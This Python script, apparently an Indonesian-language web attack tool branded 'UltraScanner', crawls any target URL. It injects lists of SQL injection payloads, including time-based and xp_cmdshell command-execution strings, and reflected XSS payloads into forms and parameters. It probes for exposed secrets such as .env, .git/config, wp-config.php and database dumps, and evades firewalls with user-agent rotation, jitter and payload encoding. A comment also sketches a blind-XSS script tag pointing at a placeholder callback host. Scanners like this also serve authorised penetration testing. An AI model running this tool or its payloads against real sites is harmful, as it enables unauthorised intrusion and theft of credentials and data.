#!/usr/bin/env python3
import re
import time
import random
import argparse
import json
import threading
import html
import os
from urllib.parse import urlparse, urljoin, quote
from collections import deque, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

import httpx  # lebih modern dan async-capable, tapi kita pakai sync mode untuk kontrol delay
from bs4 import BeautifulSoup
import tldextract
from fake_useragent import UserAgent
from colorama import Fore, Style, init

# === Inisialisasi ===
init(autoreset=True)
UA = UserAgent()

# Palet warna
COLORS = {
    "info": Fore.CYAN,
    "success": Fore.GREEN,
    "warning": Fore.YELLOW,
    "error": Fore.RED,
    "critical": Fore.MAGENTA,
    "vulnerable": Fore.RED + Style.BRIGHT,
    "bypass": Fore.BLUE + Style.BRIGHT,
    "reset": Style.RESET_ALL
}

SQLI_BASE_PAYLOADS = [
    # Payload dasar
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "admin'--",
    "admin' #",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR SLEEP(5)--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    
    # --- Tambahan 20 Payload ---
    "' OR 'x'='x",
    "') OR ('a'='a",
    "')) OR (('a'='a",
    "' OR 1=1 LIMIT 1--",
    "\" OR 1=1 LIMIT 1--",
    "' OR 'a'='a'#",
    "1' ORDER BY 1--",
    "1' ORDER BY 99--",
    "' AND 1=1--",
    "' AND (SELECT 1 FROM some_table)='1",
    "'/**/OR/**/1=1--",
    "'+OR+1=1--",
    "oR 1=1--",
    "' uNIoN sEleCt 1,2,3--",
    "admin' AND 1=1--",
    "' OR 1=CAST(CONCAT(CHAR(83),CHAR(81),CHAR(76)) AS SIGNED)--",
    "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
    "' AND IF(1=1,SLEEP(5),0)--",
    "%27 OR 1=1--",
    "' OR TRUE--"
]
      
XSS_BASE_PAYLOADS = [
    # Payload dasar
    "<script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "\"><svg/onload=alert('XSS')>",
    
    # --- Tambahan 20 Payload ---
    "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS');\"></iframe>",
    "<a href=\"javascript:alert('XSS')\">Click me</a>",
    "<details open ontoggle=alert('XSS')>",
    "<ScRiPt>alert('XSS')</sCrIpT>",
    "<img src=\"x:x\" onerror=\"alert(String.fromCharCode(88,83,83))\">",
    "<svg><script>alert(1)</script></svg>",
    "javascript:alert('XSS')",
    "<object data=\"javascript:alert('XSS')\"></object>",
    "<input onfocus=alert('XSS') autofocus>",
    "<div style=\"width:100px;height:100px;\" onmouseover=alert('XSS')></div>",
    "<video src=x onerror=alert('XSS')></video>",
    "';alert('XSS');//",
    "`<script>alert('XSS')</script>`",
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "<style>@import 'javascript:alert(\"XSS\")';</style>",
    "<marquee onstart=alert('XSS')>",
    "<form action=\"javascript:alert('XSS')\"><input type=submit></form>",
    ""
]
   
COMMON_PATHS = [
    # Path dasar (1-12)
    "admin/", "login/", "dashboard/", "admin.php", "login.php", "wp-admin/",
    "robots.txt", ".env", ".git/config", "config.php", "backup.zip", "test.php",
    
    # Tambahan pertama (13-32)
    "administrator/", "admin-panel/", "cpanel/", "phpmyadmin/", "web.config",
    "settings.php", "phpinfo.php", "access.log", "error.log", "database.yml",
    "backup.sql", "site.tar.gz", "www.zip", "api/", "vendor/",
    "composer.json", "package.json", "/.svn/entries", "uploads/", "shell.php",
    
    # --- Tambahan hingga 100 Path ---
    
    # Variasi Admin & Login (33-45)
    "adm/",
    "admin.html",
    "login.html",
    "user/",
    "account/",
    "member/",
    "portal/",
    "admin_area/",
    "admin_login/",
    "backend/",
    "client-login/",
    "webadmin/",
    "manage/",

    # File Konfigurasi Sensitif (46-60)
    ".htaccess",
    ".htpasswd",
    "wp-config.php",
    "configuration.php", # Joomla
    "config.inc.php",
    "config.json",
    "settings.json",
    "credentials.json",
    "secrets.yml",
    "env.php", # Magento 2
    "app/etc/local.xml", # Magento 1
    "parameters.yml",
    "db.php",
    "local.properties",
    "nginx.conf",
    
    # Backup & Arsip (61-75)
    "backup/",
    "backups/",
    "_backup/",
    "dump.sql",
    "database.sql",
    "db.zip",
    "db.tar.gz",
    "site.rar",
    "data.zip",
    "archive.zip",
    "backup.bak",
    "dump.sql.gz",
    "backup.tar",
    "index.bak",
    "index.old",

    # Log & Info (76-85)
    "logs/",
    "log.txt",
    "debug.log",
    "system.log",
    "install.log",
    "error.txt",
    "server-status",
    "info.php",
    "CHANGELOG.txt",
    "README.md",

    # Direktori & File Umum Lainnya (86-100)
    "assets/",
    "includes/",
    "scripts/",
    "tmp/",
    "temp/",
    "files/",
    "media/",
    "download.php",
    "upload.php",
    "/.idea/", # JetBrains IDE
    "/.vscode/", # VSCode
    "/.DS_Store", # macOS
    "xmlrpc.php", # WordPress
    "v1/",
    "v2/"
]

SECURITY_HEADERS = [
    "Content-Security-Policy", "Strict-Transport-Security", "X-Content-Type-Options",
    "X-Frame-Options", "Referrer-Policy", "Permissions-Policy"
]

WAF_SIGNATURES = {
    "cloudflare": ["cloudflare"], 
    "sucuri": ["sucuri", "sucuri firewall"],
    "modsecurity": ["mod_security", "modsecurity"],
    "incapsula": ["incapsula"],
    "akamai": ["akamai"],
}

# Utility functions
def randomize_case(s: str):
    return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in s)

def encode_variants(payload: str):
    variants = set()
    variants.add(payload)
    variants.add(quote(payload))
    variants.add(randomize_case(payload))
    variants.add(html.escape(payload))
    # comment injection (SQL)
    variants.add(payload.replace("'", "'/*x*/'"))
    return list(variants)

def banner():
    print(f"""{COLORS['critical']}
██████╗ ███████╗███████╗██████╗  █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
██║  ██║█████╗  █████╗  ██████╔╝███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██║  ██║██╔══╝  ██╔══╝  ██╔══██╗██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██████╔╝███████╗███████╗██║  ██║██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
{COLORS['reset']}{COLORS['warning']}v3.0 | UltraScanner Suite | RenXploit ~ ngoprek.xyz Project{COLORS['reset']}
""")

class WebScannerSuite:
    def __init__(self, start_url, max_depth=2, delay=0.5, threads=8, args=None):
        self.start_url = self._normalize_url(start_url, start_url)
        self.base_domain = tldextract.extract(start_url).registered_domain
        self.max_depth = max_depth
        self.delay = delay
        self.threads = threads
        self.args = args

        self.session = httpx.Client(follow_redirects=True, headers={"User-Agent": UA.random}, timeout=10.0)
        self.lock = threading.Lock()

        self.queue = deque([(self.start_url, 0)])
        self.visited = set()
        self.param_cache = set()

        self.results = {
            "links": set(),
            "forms": [],
            "params": set(),
            "sensitive_paths": set(),
            "security_headers": {},
            "waf": set(),
            "fingerprint": {},
            "vulnerabilities": {
                "sqli": [],
                "xss": []
            },
            "timings": defaultdict(list),
            "adaptive": {}
        }

    def _is_same_domain(self, url):
        try:
            return tldextract.extract(url).registered_domain == self.base_domain
        except:
            return False

    def _normalize_url(self, url, base_url):
        full = urljoin(base_url, url)
        return full.split('#')[0].rstrip('/')

    def _fetch(self, url, method='get', params=None, data=None, extra_headers=None):
        """Fetch terpusat dengan adaptive bypass (user-agent rotate + jitter)."""
        time.sleep(self.delay * random.uniform(0.8, 1.3))  # jitter
        headers = {}
        if extra_headers:
            headers.update(extra_headers)
        headers["User-Agent"] = UA.random
        try:
            if method.lower() == 'get':
                r = self.session.get(url, params=params, headers=headers)
            else:
                r = self.session.post(url, data=data, params=params, headers=headers)
            return r
        except httpx.RequestError as e:
            with self.lock:
                print(f"{COLORS['error']}[-] Request error ke {url}: {e}")
            return None

    def fingerprint_waf(self, response):
        """Deteksi WAF sederhana dari header atau body."""
        lower_body = response.text.lower() if response and response.text else ""
        for name, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig in (response.headers.get("server", "").lower() or "") or sig in lower_body:
                    self.results["waf"].add(name)
        # Simpan header fingerprint
        self.results["fingerprint"]["server"] = response.headers.get("server", "unknown")
        if "x-powered-by" in response.headers:
            self.results["fingerprint"]["x-powered-by"] = response.headers.get("x-powered-by")

    def scan_security_headers(self):
        print(f"\n{COLORS['info']}[*] Memulai pemindaian Security Header...")
        r = self._fetch(self.start_url)
        if not r:
            return
        self.fingerprint_waf(r)
        headers = {h.lower(): r.headers.get(h, "") for h in r.headers}
        for header in SECURITY_HEADERS:
            present = header.lower() in headers and headers.get(header.lower(), "")
            self.results["security_headers"][header] = (bool(present), headers.get(header.lower(), "Tidak ditemukan"))
        print(f"{COLORS['success']}[+] Security Header selesai.")

    def scan_directories(self):
        print(f"\n{COLORS['info']}[*] Memulai pemindaian Direktori & File Sensitif (paralel)...")
        found = []
        def worker(path):
            target = urljoin(self.start_url + '/', path)
            try:
                r = self.session.head(target, timeout=5.0)
                if r.status_code != 404:
                    with self.lock:
                        print(f"{COLORS['success']}[FOUND] {target} (Status: {r.status_code})")
                        self.results["sensitive_paths"].add(f"{target} [{r.status_code}]")
            except Exception:
                pass

        with ThreadPoolExecutor(max_workers=min(self.threads, len(COMMON_PATHS))) as ex:
            futures = [ex.submit(worker, p) for p in COMMON_PATHS]
            for _ in as_completed(futures):
                continue
        print(f"{COLORS['success']}[+] Direktori/file sensitif selesai.")

    def _extract_content(self, soup, base_url):
        links = set()
        for tag in soup.find_all(['a', 'link', 'script', 'img'], href=True) + soup.find_all(['iframe', 'frame', 'script', 'img'], src=True):
            href = tag.get('href') or tag.get('src')
            if href and not href.startswith(('javascript:', 'mailto:', 'tel:')):
                full = self._normalize_url(href, base_url)
                if self._is_same_domain(full):
                    links.add(full)
        self.results["links"].update(links)

        forms_details = []
        for form in soup.find_all('form'):
            action = self._normalize_url(form.get('action', ''), base_url)
            method = form.get('method', 'get').lower()
            inputs = []
            for i in form.find_all(['input', 'textarea', 'select']):
                typ = i.get('type', 'text')
                inputs.append({"type": typ, "name": i.get('name'), "value": i.get('value', '')})
            forms_details.append({"action": action, "method": method, "inputs": inputs})
            if {"action": action, "method": method, "inputs": inputs} not in self.results["forms"]:
                self.results["forms"].append({"action": action, "method": method, "inputs": inputs})

        parsed = urlparse(base_url)
        if parsed.query:
            for part in parsed.query.split('&'):
                if '=' in part:
                    self.results["params"].add(part.split('=')[0])

        return links, forms_details

    def scan_sqli(self, url, method='get', form_inputs=None):
        start = time.time()
        base_info = f"{url} [{method.upper()}]"
        if form_inputs:
            base_info += " (form)"
        # adaptasi jika ada WAF
        waf_present = bool(self.results["waf"])
        tried = set()

        def test_payload(p):
            if p in tried:
                return None
            tried.add(p)
            variants = encode_variants(p)
            for v in variants:
                payload_info = v
                if form_inputs:
                    data = {}
                    for inp in form_inputs:
                        if not inp.get('name'):
                            continue
                        if inp['type'] in ['submit', 'button']:
                            data[inp['name']] = inp.get('value', '')
                        else:
                            data[inp['name']] = v
                    response = self._fetch(url, method=method, data=data)
                elif '?' in url:
                    parsed = urlparse(url)
                    query = parsed.query
                    for param in query.split('&'):
                        if '=' not in param: continue
                        key = param.split('=')[0]
                        base = url.replace(f"{key}=", f"{key}={quote(v)}")
                        response = self._fetch(base)
                        break
                else:
                    continue

                if not response:
                    continue

                lower = response.text.lower()
                # Error-based detection
                error_signs = [
                    "you have an error in your sql syntax", "warning: mysql",
                    "unclosed quotation mark", "syntax error", "mysql_fetch", "pdoexception",
                    "sql syntax", "mysql num_rows"
                ]
                if any(err in lower for err in error_signs):
                    finding = {
                        "target": url,
                        "type": "error-based",
                        "payload": payload_info,
                        "context": form_inputs or "url-param",
                        "bypass_type": "obfuscated" if v != p else "raw",
                        "confidence": "high"
                    }
                    with self.lock:
                        print(f"{COLORS['vulnerable']}[SQLi ERROR-BASED] {finding}")
                        self.results["vulnerabilities"]["sqli"].append(finding)
                        return True

                # Time-based blind
                if "sleep" in v.lower() or "delay" in v.lower():
                    # lihat delay respons
                    elapsed = response.elapsed.total_seconds()
                    if elapsed >= 4:  # threshold
                        finding = {
                            "target": url,
                            "type": "time-based",
                            "payload": payload_info,
                            "measured_delay": elapsed,
                            "bypass_type": "delay-injection",
                            "confidence": "medium-high"
                        }
                        with self.lock:
                            print(f"{COLORS['vulnerable']}[SQLi TIME-BASED] {finding}")
                            self.results["vulnerabilities"]["sqli"].append(finding)
                            return True

                # UNION detection (simplified)
                if "union select" in v.lower():
                    if "union" in lower:
                        finding = {
                            "target": url,
                            "type": "union-based",
                            "payload": payload_info,
                            "bypass_type": "union-injection",
                            "confidence": "medium"
                        }
                        with self.lock:
                            print(f"{COLORS['vulnerable']}[SQLi UNION] {finding}")
                            self.results["vulnerabilities"]["sqli"].append(finding)
                            return True
            return False

        for payload in SQLI_BASE_PAYLOADS:
            if test_payload(payload):
                break

        self.results["timings"]["sqli"].append(time.time() - start)

    def scan_xss(self, url, method='get', form_inputs=None):
        start = time.time()
        base_info = f"{url} [{method.upper()}]"
        if form_inputs:
            base_info += " (form)"

        def try_payload(p):
            variants = encode_variants(p)
            for v in variants:
                if form_inputs:
                    data = {}
                    for inp in form_inputs:
                        if not inp.get('name'):
                            continue
                        if inp['type'] in ['text', 'search', 'url', 'email', 'textarea']:
                            data[inp['name']] = v
                        else:
                            data[inp['name']] = inp.get('value', '')
                    response = self._fetch(url, method=method, data=data)
                else:
                    if '?' in url:
                        test_url = url + quote(v)
                        response = self._fetch(test_url)
                    else:
                        continue

                if not response:
                    continue

                if v in response.text:
                    finding = {
                        "target": url,
                        "type": "reflected",
                        "payload": v,
                        "bypass_type": "encoded" if v != p else "raw",
                        "confidence": "high"
                    }
                    with self.lock:
                        print(f"{COLORS['vulnerable']}[XSS REFLECTED] {finding}")
                        self.results["vulnerabilities"]["xss"].append(finding)
                        return True
            return False

        for payload in XSS_BASE_PAYLOADS:
            if try_payload(payload):
                break

        # placeholder blind XSS (user bisa integrasi dengan out-of-band service)
        # contoh: memasukkan <script src="https://your-collab-id.burpcollaborator.net"></script>
        self.results["timings"]["xss"].append(time.time() - start)

    def crawl(self):
        print(f"\n{COLORS['info']}[*] Memulai crawling: {self.start_url}")
        self.queue = deque([(self.start_url, 0)])
        self.visited = set()

        while self.queue:
            url, depth = self.queue.popleft()
            if url in self.visited or depth > self.max_depth:
                continue

            print(f"{COLORS['success']}[CRAWL] {url} (Depth {depth})")
            r = self._fetch(url)
            if not r or r.status_code != 200:
                continue

            self.visited.add(url)
            self.fingerprint_waf(r)
            soup = BeautifulSoup(r.text, 'html.parser')
            links, forms = self._extract_content(soup, url)

            to_scan = []
            if self.args.full_scan or self.args.scan_sqli or self.args.scan_xss:
                if '?' in url:
                    if self.args.scan_sqli:
                        to_scan.append(("sqli", url, "get", None))
                    if self.args.scan_xss:
                        to_scan.append(("xss", url, "get", None))
                for form in forms:
                    if self.args.scan_sqli:
                        to_scan.append(("sqli", form['action'], form['method'], form['inputs']))
                    if self.args.scan_xss:
                        to_scan.append(("xss", form['action'], form['method'], form['inputs']))

            # paralel scanning per URL/form
            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                futures = []
                for typ, target, method, inputs in to_scan:
                    if typ == "sqli":
                        futures.append(ex.submit(self.scan_sqli, target, method, inputs))
                    elif typ == "xss":
                        futures.append(ex.submit(self.scan_xss, target, method, inputs))
                for f in as_completed(futures):
                    pass  # hasil sudah ditampung internal

            for link in links:
                if link not in self.visited and link not in [q[0] for q in self.queue]:
                    self.queue.append((link, depth + 1))

    def generate_html_report(self, filename="report.html"):
        now = time.strftime("%Y-%m-%d %H:%M:%S")
        html_parts = [f"<html><head><title>Scan Report {self.start_url}</title><meta charset='utf-8'/><style>"
                      "body{font-family:system-ui;background:#0f0f17;color:#e8e8e8;padding:20px;} .card{background:#1f1f35;border-radius:12px;padding:15px;margin:10px 0;box-shadow:0 10px 30px rgba(0,0,0,0.4);} h1{color:#f0a500;} .vuln{color:#ff6b6b;} .good{color:#51cf66;}"
                      "</style></head><body>"]
        html_parts.append(f"<h1>Scan Report - {self.start_url}</h1><small>Generated: {now}</small>")
        html_parts.append("<div class='card'><h2>Summary</h2>")
        html_parts.append(f"<p>Total URL visited: {len(self.visited)}</p>")
        html_parts.append(f"<p>WAF Detected: {', '.join(self.results['waf']) or 'None'}</p>")
        html_parts.append(f"<p>Security Headers:</p><ul>")
        for h, (present, val) in self.results["security_headers"].items():
            status = "✅" if present else "❌"
            html_parts.append(f"<li>{h}: {status} ({val})</li>")
        html_parts.append("</ul></div>")

        # Vulnerabilities
        html_parts.append("<div class='card'><h2>Vulnerabilities</h2>")
        if self.results["vulnerabilities"]["sqli"]:
            html_parts.append("<div class='vuln'><h3>SQLi</h3><ul>")
            for v in self.results["vulnerabilities"]["sqli"]:
                html_parts.append(f"<li>{json.dumps(v)}</li>")
            html_parts.append("</ul></div>")
        if self.results["vulnerabilities"]["xss"]:
            html_parts.append("<div class='vuln'><h3>XSS</h3><ul>")
            for v in self.results["vulnerabilities"]["xss"]:
                html_parts.append(f"<li>{json.dumps(v)}</li>")
            html_parts.append("</ul></div>")
        if not self.results["vulnerabilities"]["sqli"] and not self.results["vulnerabilities"]["xss"]:
            html_parts.append("<p class='good'>No SQLi/XSS detected.</p>")
        html_parts.append("</div>")

        # Crawled links
        html_parts.append("<div class='card'><h2>Crawled Links & Forms</h2>")
        html_parts.append(f"<p>Links discovered: {len(self.results['links'])}</p><ul>")
        for l in sorted(self.results["links"]):
            html_parts.append(f"<li>{l}</li>")
        html_parts.append("</ul>")
        html_parts.append(f"<p>Forms found: {len(self.results['forms'])}</p><ul>")
        for f in self.results["forms"]:
            html_parts.append(f"<li>{html.escape(str(f))}</li>")
        html_parts.append("</ul></div>")

        # Sensitive paths
        if self.results["sensitive_paths"]:
            html_parts.append("<div class='card'><h2>Sensitive Paths</h2><ul>")
            for p in sorted(self.results["sensitive_paths"]):
                html_parts.append(f"<li>{p}</li>")
            html_parts.append("</ul></div>")

        html_parts.append("</body></html>")
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write("\n".join(html_parts))
            print(f"{COLORS['success']}[+] HTML report disimpan ke {filename}")
        except Exception as e:
            print(f"{COLORS['error']}[-] Gagal simpan HTML report: {e}")

    def save_json(self, filename="report.json"):
        try:
            with open(filename, "w", encoding="utf-8") as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            print(f"{COLORS['success']}[+] JSON report disimpan ke {filename}")
        except Exception as e:
            print(f"{COLORS['error']}[-] Gagal simpan JSON: {e}")

    def generate_console_report(self):
        print(f"\n{COLORS['success']}{'='*60}")
        print(f"{'LAPORAN AKHIR PEMINDAIAN':^60}")
        print(f"{'='*60}{COLORS['reset']}")
        if self.results["vulnerabilities"]["sqli"] or self.results["vulnerabilities"]["xss"]:
            print(f"\n{COLORS['vulnerable']}[!!!] DITEMUKAN POTENSI KERENTANAN [!!!]")
            if self.results["vulnerabilities"]["sqli"]:
                print(f"\n  {COLORS['critical']}[ SQL INJECTION ]")
                for vuln in self.results["vulnerabilities"]["sqli"]:
                    print(f"  - {vuln}")
            if self.results["vulnerabilities"]["xss"]:
                print(f"\n  {COLORS['critical']}[ CROSS-SITE SCRIPTING (XSS) ]")
                for vuln in self.results["vulnerabilities"]["xss"]:
                    print(f"  - {vuln}")
        else:
            print(f"\n{COLORS['success']}[+] Tidak ditemukan SQLi atau XSS.")

        if self.results["sensitive_paths"]:
            print(f"\n{COLORS['warning']}[ DIREKTORI & FILE SENSITIF DITEMUKAN ]")
            for path in sorted(self.results["sensitive_paths"]):
                print(f" - {path}")

        if self.results["security_headers"]:
            print(f"\n{COLORS['info']}[ ANALISIS SECURITY HEADER ]")
            for h, (present, val) in self.results["security_headers"].items():
                status = f"{COLORS['success']}Ditemukan" if present else f"{COLORS['error']}Hilang"
                print(f" - {h:<25}: {status} - {val}")

        if self.results["waf"]:
            print(f"\n{COLORS['bypass']}[ WAF / Proteksi Terdeteksi ]: {', '.join(self.results['waf'])}")
        if self.results["fingerprint"]:
            print(f"\n{COLORS['info']}[ FINGERPRINT ]")
            for k, v in self.results["fingerprint"].items():
                print(f" - {k}: {v}")

        print(f"\n{COLORS['info']}[ HASIL CRAWLING ]")
        print(f" - Total URL Dikunjungi: {len(self.visited)}")
        print(f" - Total Link Ditemukan: {len(self.results['links'])}")
        print(f" - Total Form Ditemukan: {len(self.results['forms'])}")
        print(f" - Total Parameter Unik: {len(self.results['params'])}")

        # Timing info
        print(f"\n{COLORS['info']}[ TIMING ]")
        for k, v in self.results["timings"].items():
            avg = sum(v)/len(v) if v else 0
            print(f" - {k}: panggilan={len(v)} rata-rata delay={avg:.2f}s")

        print(f"\n{COLORS['success']}{'='*60}")
        print(f"{'PEMINDAIAN SELESAI':^60}")
        print(f"{'='*60}{COLORS['reset']}")

    def run(self):
        if self.args.scan_headers or self.args.full_scan:
            self.scan_security_headers()
        if self.args.scan_dirs or self.args.full_scan:
            self.scan_directories()
        if self.args.depth > -1:
            self.crawl()

        self.generate_console_report()
        if self.args.output:
            base = os.path.splitext(self.args.output)[0]
            self.save_json(f"{base}.json")
            self.generate_html_report(f"{base}.html")


def parse_args():
    parser = argparse.ArgumentParser(
        description='UltraScanner Pro - Next Gen Web Security Suite',
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-d', '--depth', type=int, default=2, help='Kedalaman crawling')
    parser.add_argument('-D', '--delay', type=float, default=0.5, help='Delay dasar antar request')
    parser.add_argument('-t', '--threads', type=int, default=6, help='Jumlah thread paralel')
    parser.add_argument('-o', '--output', type=str, help='Prefix output file (misal: hasil_scan)')

    scan_group = parser.add_argument_group('Modul Pemindaian')
    scan_group.add_argument('--scan-sqli', action='store_true', help='Scan SQLi')
    scan_group.add_argument('--scan-xss', action='store_true', help='Scan XSS')
    scan_group.add_argument('--scan-dirs', action='store_true', help='Scan direktori sensitif')
    scan_group.add_argument('--scan-headers', action='store_true', help='Scan security headers')
    scan_group.add_argument('--full-scan', action='store_true', help='Enable semua modul')

    return parser.parse_args()

if __name__ == "__main__":
    banner()
    args = parse_args()
    if args.full_scan:
        args.scan_sqli = args.scan_xss = args.scan_dirs = args.scan_headers = True

    scanner = WebScannerSuite(
        start_url=args.url,
        max_depth=args.depth,
        delay=args.delay,
        threads=args.threads,
        args=args
    )
    try:
        scanner.run()
    except KeyboardInterrupt:
        print(f"\n{COLORS['error']}[!] Diinterupsi! Generate laporan parsial...")
        scanner.generate_console_report()
        if args.output:
            scanner.save_json(f"{os.path.splitext(args.output)[0]}.json")
            scanner.generate_html_report(f"{os.path.splitext(args.output)[0]}.html")
    except Exception as e:
        print(f"{COLORS['critical']}[!!!] Error fatal: {e}")
        scanner.generate_console_report()
        if args.output:
            scanner.save_json(f"{os.path.splitext(args.output)[0]}.json")
            scanner.generate_html_report(f"{os.path.splitext(args.output)[0]}.html")
